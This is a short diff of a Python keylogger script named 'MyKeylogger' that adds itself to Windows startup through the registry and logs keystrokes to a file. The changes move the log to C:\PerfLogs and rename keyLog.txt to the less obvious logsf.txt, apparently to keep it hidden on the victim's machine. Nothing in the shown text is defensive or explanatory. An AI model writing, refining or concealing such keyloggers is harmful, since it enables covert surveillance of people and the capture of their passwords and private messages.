@@ -5,7 +5,7 @@ import os
 import sys
 import winreg as reg
 
-logDir = r"X:/HMMMM/Keylogger"
+logDir = r"C:\PerfLogs"
 script_path = os.path.realpath(sys.argv[0])
 
 # Auto-start setup
@@ -18,7 +18,7 @@ def add_to_startup(name, path):
 add_to_startup("MyKeylogger", script_path)
 
 # Keylogging
-logging.basicConfig(filename=(logDir + r"/keyLog.txt"),
+logging.basicConfig(filename=(logDir + r"/logsf.txt"),
                     level=logging.DEBUG,
                     format='%(asctime)s: %(message)s')
 
